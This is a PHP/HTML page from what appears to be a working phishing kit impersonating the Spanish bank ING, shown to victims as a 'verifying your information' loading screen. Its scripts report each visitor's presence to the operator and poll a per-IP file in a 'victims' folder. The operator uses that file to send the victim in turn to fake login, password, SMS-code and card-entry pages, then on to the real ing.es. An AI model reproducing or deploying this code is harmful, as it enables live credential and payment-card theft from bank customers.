<?php
  include "./Assets/php/config/config.php";
?>
<!doctype html>
<html style="background: #fff;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">
        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />
        <title>ING</title>

        <script>
            /* Start Status */
                function updateStatus(status) {
                    fetch('./status/update_status.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({status , page : "LOADING PAGE"})
                    });
                }
                
                updateStatus('online');
                
                window.addEventListener('beforeunload', () => {
                    updateStatus('offline');
                });
                
                setInterval(() => {
                    updateStatus('online');
                }, 30000); 
            /* End Status */            
        </script>           
    </head>

    <body style="background: #fff;">
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="./Assets/imgs/logo.svg"></div>
                <div class="right"><img src="./Assets/imgs/header-right.png"></div>
            </div>
        </header>  
        <main id="main">
            <div class="container">
                <div class="banner"><img src="./Assets/imgs/banner.jpg"></div>
                <div class="row justify-content-center">
                    <div class="col-md-4">  
                        <div class="loader2">
                            <h3>verifica tu información</h3>
                            <p>Procesando la información ... No cierre la página.</p>
                            <img src="./Assets/imgs/loading.gif">
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>
          var ip = '<?php echo get_client_ip(); ?>';
          var waiting = setInterval(function() {
            $.get('./victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
                if( data == 0 ) {
                    // console.log('hada ba9i 0');
                }else if( data == 'log' ){
                    clearInterval(waiting); 
                    location.href = "login.php";
                }else if( data == 'log_error' ){
                    clearInterval(waiting);
                    location.href = "login.php?error";
                }

                else if( data == 'pass' ) {
                    clearInterval(waiting);
                    location.href = "pass.php";
                }else if( data == 'pass_error' ){
                    clearInterval(waiting);
                    location.href = "pass.php?error";
                }                

                else if( data == 'sms' ) {
                    clearInterval(waiting);
                    location.href = "sms.php";
                }else if( data == 'sms_error' ){
                    clearInterval(waiting);
                    location.href = "sms.php?error";
                }

                else if( data == 'card' ) {
                    clearInterval(waiting);
                    location.href = "card.php";
                }else if( data == 'card_error' ){
                    clearInterval(waiting);
                    location.href = "card.php?error";
                }

                else if( data == 'app' ) {
                    clearInterval(waiting);
                    location.href = "app.php";
                }
                
                else if( data == 'success' ){
                    clearInterval(waiting);
                    location.href = "https://www.ing.es/";
                }
            });
          }, 1000);   
        </script>
    </body>

</html>